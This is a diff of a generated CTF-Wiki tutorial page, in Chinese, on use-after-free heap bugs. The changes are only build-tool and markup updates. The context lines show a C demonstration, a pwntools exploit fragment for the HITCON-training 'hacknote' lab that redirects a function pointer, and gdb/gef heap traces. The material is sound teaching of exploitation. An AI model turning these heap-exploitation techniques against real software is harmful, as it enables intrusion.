@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4845,7 +4845,7 @@
 </ul>
 <p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。</strong></p>
 <p>这里给出一个简单的例子</p>
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 <span class="k">typedef</span> <span class="k">struct</span> <span class="n">name</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">myname</span><span class="p">;</span>
@@ -4870,31 +4870,31 @@
   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;this pogram will crash...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
   <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;can not be printed...&quot;</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>运行结果如下</p>
-<div class="codehilite"><pre><span></span>➜  use_after_free git:<span class="o">(</span>use_after_free<span class="o">)</span> ✗ ./use_after_free                      
+<div class="codehilite"><pre><span></span><code>➜  use_after_free git:<span class="o">(</span>use_after_free<span class="o">)</span> ✗ ./use_after_free                      
 this is my <span class="k">function</span>
 I can also use it
 call print my name
 this pogram will crash...
 <span class="o">[</span><span class="m">1</span><span class="o">]</span>    <span class="m">38738</span> segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>  ./use_after_free
-</pre></div>
+</code></pre></div>
 
 <h2 id="_2">例子<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
 <p>这里我们以 HITCON-training 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">lab 10 hacknote</a> 为例。</p>
 <h3 id="_3">功能分析<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <p>我们可以简单分析下程序，可以看出在程序的开头有个menu函数，其中有</p>
-<div class="codehilite"><pre><span></span>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 1. Add note          &quot;</span><span class="p">);</span>
+<div class="codehilite"><pre><span></span><code>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 1. Add note          &quot;</span><span class="p">);</span>
   <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 2. Delete note       &quot;</span><span class="p">);</span>
   <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 3. Print note        &quot;</span><span class="p">);</span>
   <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 4. Exit              &quot;</span><span class="p">);</span>
-</pre></div>
+</code></pre></div>
 
 <p>故而程序应该主要有3个功能。之后程序会根据用户的输入执行相应的功能。</p>
 <h4 id="add_note">add_note<a class="headerlink" href="#add_note" title="Permanent link">&para;</a></h4>
 <p>根据程序，我们可以看出程序最多可以添加5个note。每个note有两个字段put与content，其中put会被设置为一个函数，其函数会输出 content 具体的内容。</p>
-<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">add_note</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">add_note</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="n">note</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// ebx</span>
   <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-1Ch]</span>
@@ -4940,11 +4940,11 @@ this pogram will crash...
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h4 id="print_note">print_note<a class="headerlink" href="#print_note" title="Permanent link">&para;</a></h4>
 <p>print_note就是简单的根据给定的note的索引来输出对应索引的note的内容。</p>
-<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">print_note</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">print_note</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-14h]</span>
   <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-10h]</span>
@@ -4963,11 +4963,11 @@ this pogram will crash...
     <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">put</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
   <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h4 id="delete_note">delete_note<a class="headerlink" href="#delete_note" title="Permanent link">&para;</a></h4>
 <p>delete_note 会根据给定的索引来释放对应的note。但是值得注意的是，在 删除的时候，只是单纯进行了free，而没有设置为NULL，那么显然，这里是存在Use After Free的情况的。</p>
-<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">del_note</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">del_note</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-14h]</span>
   <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-10h]</span>
@@ -4990,14 +4990,14 @@ this pogram will crash...
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="_4">利用分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个magic函数，我们有没有可能来通过use after free 来使得这个程序执行magic函数呢？<strong>一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。</strong> 那么该怎么执行呢？                                                                         </p>
 <p>我们可以简单来看一下每一个note生成的具体流程</p>
 <ol>
 <li>程序申请8字节内存用来存放note中的put以及content指针。</li>
-<li>程序根据输入的size来申请指定大小的内存，然后用来存储content。<div class="codehilite"><pre><span></span>   +-----------------+                       
+<li>程序根据输入的size来申请指定大小的内存，然后用来存储content。<div class="codehilite"><pre><span></span><code>   +-----------------+                       
    |   put           |                       
    +-----------------+                       
    |   content       |       size              
@@ -5006,7 +5006,7 @@ this pogram will crash...
                                           |    content     |
                                           |                |
                                           +----------------+
-</pre></div>
+</code></pre></div>
 
 
 </li>
@@ -5024,7 +5024,7 @@ this pogram will crash...
 <li>如果我们这时候向note2 real content的chunk部分写入magic的地址，那么由于我们没有note0为NULL。当我们再次尝试输出note0的时候，程序就会调用magic函数。</li>
 </ul>
 <h3 id="_5">利用脚本<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -5069,25 +5069,25 @@ this pogram will crash...
 <span class="n">printnote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># print note 0</span>
 
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>我们可以具体看一下执行的流程，首先先下断点</p>
 <p><strong>两处malloc下断点</strong></p>
-<div class="codehilite"><pre><span></span>gef➤  b *0x0804875C
+<div class="codehilite"><pre><span></span><code>gef➤  b *0x0804875C
 Breakpoint <span class="m">1</span> at 0x804875c
 gef➤  b *0x080486CA
 Breakpoint <span class="m">2</span> at 0x80486ca
-</pre></div>
+</code></pre></div>
 
 <p><strong>两处free下断点</strong></p>
-<div class="codehilite"><pre><span></span>gef➤  b *0x08048893
+<div class="codehilite"><pre><span></span><code>gef➤  b *0x08048893
 Breakpoint <span class="m">3</span> at 0x8048893
 gef➤  b *0x080488A9
 Breakpoint <span class="m">4</span> at 0x80488a9
-</pre></div>
+</code></pre></div>
 
 <p>然后继续执行程序，可以看出申请note0时，所申请到的内存块地址为0x0804b008。（eax存储函数返回值）</p>
-<div class="codehilite"><pre><span></span><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
 <span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x00000000</span>
 <span class="nf">$ecx</span>   <span class="p">:</span> <span class="mi">0xf7fac780</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
 <span class="nf">$edx</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
@@ -5135,10 +5135,10 @@ Breakpoint <span class="m">4</span> at 0x80488a9
 <span class="nf">PREV_INUSE</span> <span class="no">flag</span><span class="p">:</span> <span class="no">On</span>
 <span class="nf">IS_MMAPPED</span> <span class="no">flag</span><span class="p">:</span> <span class="no">Off</span>
 <span class="nf">NON_MAIN_ARENA</span> <span class="no">flag</span><span class="p">:</span> <span class="no">Off</span>
-</pre></div>
+</code></pre></div>
 
 <p><strong>申请note 0的content的地址为0x0804b018</strong></p>
-<div class="codehilite"><pre><span></span><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x0804b018</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x0804b018</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
 <span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x0804865b</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">print_note_content</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">ebp</span>
 <span class="nf">$ecx</span>   <span class="p">:</span> <span class="mi">0xf7fac780</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
 <span class="nf">$edx</span>   <span class="p">:</span> <span class="mi">0x0804b018</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
@@ -5186,11 +5186,11 @@ Breakpoint <span class="m">4</span> at 0x80488a9
 <span class="nf">PREV_INUSE</span> <span class="no">flag</span><span class="p">:</span> <span class="no">On</span>
 <span class="nf">IS_MMAPPED</span> <span class="no">flag</span><span class="p">:</span> <span class="no">Off</span>
 <span class="nf">NON_MAIN_ARENA</span> <span class="no">flag</span><span class="p">:</span> <span class="no">Off</span>
-</pre></div>
+</code></pre></div>
 
 <p>类似的，我们可以得到note1的地址以及其content的地址分别为0x0804b040 和0x0804b050。</p>
 <p>同时，我们还可以看到note0与note1对应的content确实是相应的内存块。</p>
-<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">grep</span> <span class="no">aaaa</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">grep</span> <span class="no">aaaa</span>
 <span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">aaaa</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>
 <span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;</span><span class="p">[</span><span class="no">heap</span><span class="p">]</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x804b000</span><span class="p">-</span><span class="mi">0x806c000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
   <span class="err">0</span><span class="nf">x804b018</span> <span class="p">-</span> <span class="mi">0x804b01c</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="no">aaaa</span><span class="err">&quot;</span> 
@@ -5198,10 +5198,10 @@ Breakpoint <span class="m">4</span> at 0x80488a9
 <span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">ddaa</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>
 <span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;</span><span class="p">[</span><span class="no">heap</span><span class="p">]</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x804b000</span><span class="p">-</span><span class="mi">0x806c000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
   <span class="err">0</span><span class="nf">x804b050</span> <span class="p">-</span> <span class="mi">0x804b054</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="no">ddaa</span><span class="err">&quot;</span> 
-</pre></div>
+</code></pre></div>
 
 <p>下面就是free的过程了。我们可以依次发现首先，note0的content被free</p>
-<div class="codehilite"><pre><span></span> <span class="err">→</span>  <span class="err">0</span><span class="nf">x8048893</span> <span class="err">&lt;</span><span class="no">del_note</span><span class="err">+</span><span class="mi">143</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484c0</span> <span class="p">&lt;</span><span class="no">free@plt</span><span class="p">&gt;</span>
+<div class="codehilite"><pre><span></span><code> <span class="err">→</span>  <span class="err">0</span><span class="nf">x8048893</span> <span class="err">&lt;</span><span class="no">del_note</span><span class="err">+</span><span class="mi">143</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484c0</span> <span class="p">&lt;</span><span class="no">free@plt</span><span class="p">&gt;</span>
    <span class="err">↳</span>   <span class="err">0</span><span class="nf">x80484c0</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span>     <span class="no">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a018</span>
        <span class="err">0</span><span class="nf">x80484c6</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">6</span><span class="err">&gt;</span>     <span class="no">push</span>   <span class="mi">0x18</span>
        <span class="err">0</span><span class="nf">x80484cb</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span>    <span class="no">jmp</span>    <span class="mi">0x8048480</span>
@@ -5210,10 +5210,10 @@ Breakpoint <span class="m">4</span> at 0x80488a9
 <span class="err">[&#39;0</span><span class="nf">xffffcf20</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
 <span class="err">8</span>
 <span class="err">0</span><span class="nf">xffffcf20</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x0804b018</span>  <span class="err">→</span>  <span class="err">&quot;</span><span class="no">aaaa</span><span class="err">&quot;</span>  <span class="err">←</span> <span class="no">$esp</span>
-</pre></div>
+</code></pre></div>
 
 <p>然后是note0本身</p>
-<div class="codehilite"><pre><span></span> <span class="err">→</span>  <span class="err">0</span><span class="nf">x80488a9</span> <span class="err">&lt;</span><span class="no">del_note</span><span class="err">+</span><span class="mi">165</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484c0</span> <span class="p">&lt;</span><span class="no">free@plt</span><span class="p">&gt;</span>
+<div class="codehilite"><pre><span></span><code> <span class="err">→</span>  <span class="err">0</span><span class="nf">x80488a9</span> <span class="err">&lt;</span><span class="no">del_note</span><span class="err">+</span><span class="mi">165</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484c0</span> <span class="p">&lt;</span><span class="no">free@plt</span><span class="p">&gt;</span>
    <span class="err">↳</span>   <span class="err">0</span><span class="nf">x80484c0</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span>     <span class="no">jmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x804a018</span>
        <span class="err">0</span><span class="nf">x80484c6</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">6</span><span class="err">&gt;</span>     <span class="no">push</span>   <span class="mi">0x18</span>
        <span class="err">0</span><span class="nf">x80484cb</span> <span class="err">&lt;</span><span class="no">free@plt</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span>    <span class="no">jmp</span>    <span class="mi">0x8048480</span>
@@ -5222,10 +5222,10 @@ Breakpoint <span class="m">4</span> at 0x80488a9
 <span class="err">[&#39;0</span><span class="nf">xffffcf20</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
 <span class="err">8</span>
 <span class="err">0</span><span class="nf">xffffcf20</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x0804865b</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">print_note_content</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">ebp</span>  <span class="err">←</span> <span class="no">$esp</span>
-</pre></div>
+</code></pre></div>
 
 <p>当delete结束后，我们观看一下bins，可以发现，确实其被存放在对应的fast bin中，</p>
-<div class="codehilite"><pre><span></span><span class="n">gef</span><span class="err">➤</span>  <span class="n">heap</span> <span class="n">bins</span>
+<div class="codehilite"><pre><span></span><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">heap</span> <span class="n">bins</span>
 <span class="err">───────────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">Fastbins</span> <span class="k">for</span> <span class="n">arena</span> <span class="mh">0xf7fac780</span> <span class="p">]</span><span class="err">───────────────────────────────────────────────────────────</span>
 <span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x8</span><span class="p">]</span>  <span class="err">←</span>  <span class="n">UsedChunk</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="mh">0x804b008</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x10</span><span class="p">)</span> 
 <span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0xc</span><span class="p">]</span> <span class="mh">0x00</span>
@@ -5234,10 +5234,10 @@ Breakpoint <span class="m">4</span> at 0x80488a9
 <span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x18</span><span class="p">]</span> <span class="mh">0x00</span>
 <span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x1c</span><span class="p">]</span> <span class="mh">0x00</span>
 <span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x20</span><span class="p">]</span> <span class="mh">0x00</span>
-</pre></div>
+</code></pre></div>
 
 <p>当我们将note1也全部删除完毕后，再次观看bins。可以看出，后删除的chunk块确实处于表头。</p>
-<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">bins</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">bins</span>
 <span class="err">───────────────────────────────────────────────────────────[</span> <span class="nf">Fastbins</span> <span class="no">for</span> <span class="no">arena</span> <span class="mi">0xf7fac780</span> <span class="p">]</span><span class="err">───────────────────────────────────────────────────────────</span>
 <span class="nf">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x8</span><span class="p">]</span>  <span class="err">←</span>  <span class="no">UsedChunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x804b040</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x10</span><span class="p">)</span>  <span class="err">←</span>  <span class="no">UsedChunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x804b008</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x10</span><span class="p">)</span> 
 <span class="no">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">1</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0xc</span><span class="p">]</span> <span class="mi">0x00</span>
@@ -5246,11 +5246,11 @@ Breakpoint <span class="m">4</span> at 0x80488a9
 <span class="no">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">4</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x18</span><span class="p">]</span> <span class="mi">0x00</span>
 <span class="nf">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">5</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x1c</span><span class="p">]</span> <span class="mi">0x00</span>
 <span class="nf">Fastbins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">6</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x20</span><span class="p">]</span> <span class="mi">0x00</span>
-</pre></div>
+</code></pre></div>
 
 <p>那么，此时即将要申请note2，我们可以看下note2都申请到了什么内存块，如下</p>
 <p><strong>申请note2对应的内存块为0x804b040，其实就是note1对应的内存地址。</strong></p>
-<div class="codehilite"><pre><span></span><span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b040</span>
+<div class="codehilite"><pre><span></span><code><span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b040</span>
 <span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b040</span>
 <span class="err">0</span><span class="nf">x080486cf</span> <span class="no">in</span> <span class="no">add_note</span> <span class="p">()</span>
 <span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">registers</span> <span class="p">]</span><span class="err">────</span>
@@ -5275,10 +5275,10 @@ Breakpoint <span class="m">4</span> at 0x80488a9
     <span class="err">0</span><span class="nf">x80486c4</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">78</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">0x86a0cec</span><span class="p">],</span> <span class="no">al</span>
     <span class="err">0</span><span class="nf">x80486ca</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">84</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="mh">0x80484e0</span> <span class="p">&lt;</span><span class="no">malloc@plt</span><span class="p">&gt;</span>
  <span class="err">→</span>  <span class="err">0</span><span class="nf">x80486cf</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">89</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
-</pre></div>
+</code></pre></div>
 
 <p><strong>申请note2的content的内存地址为0x804b008，就是note0对应的地址，即此时我们向note2的content写内容，就会将note0的put字段覆盖。</strong></p>
-<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">n</span> <span class="mi">1</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">n</span> <span class="mi">1</span>
 <span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b008</span>
 <span class="err">[+]</span> <span class="nf">Heap-Analysis</span> <span class="p">-</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="err">=</span><span class="mi">0x804b008</span>
 <span class="err">0</span><span class="nf">x08048761</span> <span class="no">in</span> <span class="no">add_note</span> <span class="p">()</span>
@@ -5304,23 +5304,23 @@ Breakpoint <span class="m">4</span> at 0x80488a9
     <span class="err">0</span><span class="nf">x8048757</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">225</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mi">0x581173df</span>
     <span class="err">0</span><span class="nf">x804875c</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">230</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484e0</span> <span class="p">&lt;</span><span class="no">malloc@plt</span><span class="p">&gt;</span>
  <span class="err">→</span>  <span class="err">0</span><span class="nf">x8048761</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">235</span><span class="err">&gt;</span>   <span class="no">add</span>    <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
-</pre></div>
+</code></pre></div>
 
 <p>我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的put指针已经被置为NULL了，这是由fastbin的free机制决定的。</p>
-<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">2</span><span class="no">xw</span> <span class="mi">0x804b008</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">2</span><span class="no">xw</span> <span class="mi">0x804b008</span>
 <span class="err">0</span><span class="nl">x804b008:</span>  <span class="err">0</span><span class="nf">x00000000</span>  <span class="mi">0x0804b018</span>
-</pre></div>
+</code></pre></div>
 
 <p>覆盖后，具体的值如下</p>
-<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">2</span><span class="no">xw</span> <span class="mi">0x804b008</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">2</span><span class="no">xw</span> <span class="mi">0x804b008</span>
 <span class="err">0</span><span class="nl">x804b008:</span>  <span class="err">0</span><span class="nf">x08048986</span>  <span class="mi">0x0804b00a</span>
 <span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">i</span> <span class="mi">0x08048986</span>
    <span class="err">0</span><span class="nf">x8048986</span> <span class="err">&lt;</span><span class="no">magic</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">push</span>   <span class="no">ebp</span>
-</pre></div>
+</code></pre></div>
 
 <p>可以看出，确实已经被覆盖为我们所想要的magic函数了。</p>
 <p>最后执行的效果如下</p>
-<div class="codehilite"><pre><span></span><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./hacknote&#39;</span>: pid <span class="m">35030</span>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./hacknote&#39;</span>: pid <span class="m">35030</span>
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 flag<span class="o">{</span>use_after_free<span class="o">}</span>----------------------
        HackNote       
@@ -5330,10 +5330,10 @@ flag<span class="o">{</span>use_after_free<span class="o">}</span>--------------
  <span class="m">3</span>. Print note        
  <span class="m">4</span>. Exit              
 ----------------------
-</pre></div>
+</code></pre></div>
 
